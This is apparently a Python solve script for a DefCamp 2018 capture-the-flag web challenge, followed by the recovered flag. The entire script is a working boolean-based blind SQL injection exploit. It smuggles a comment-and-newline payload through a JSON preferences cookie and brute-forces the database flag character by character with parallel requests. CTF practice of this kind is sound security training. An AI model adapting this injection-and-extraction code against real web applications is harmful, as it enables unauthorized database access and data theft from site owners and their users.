import requests
import json
import multiprocessing as mp
from tqdm import tqdm, trange
from urllib.parse import quote

url = 'https://secops.dctfq18.def.camp/'


def send(s):
    s = s.replace('\\n', '\n')
    cookies = {'prefs': quote(json.dumps({'flair': s}))}
    r = requests.get(url, cookies=cookies)
    assert (r.status_code == 200)
    if 'Your flair:' in r.text:
        x = r.text.index('Your flair: ') + len('Your flair: ')
        y = r.text.index('</h4>')
        assert (r.text[x:y] == 'Flag!')
        return True
    else:
        return False


payload = """' or #\n (length(flag) = 70 and (select substr(flag,%d,1)) = "%s") or "1"='"""


def check(arg):
    return send(payload % arg)


possible = 'DCTF{}abcdef1234567890'
pool = mp.Pool(32)
flag = ''
for i in trange(len(flag) + 1, 71):
    res = list(pool.map(check, [(i, c) for c in possible]))
    res = [c for c, r in zip(possible, res) if r][0]
    flag += res
    tqdm.write(flag)
"""
DCTF{346cb556a97a4396c7c09461344dc680e5446eea42788fbd729d877d1c75691b}
"""
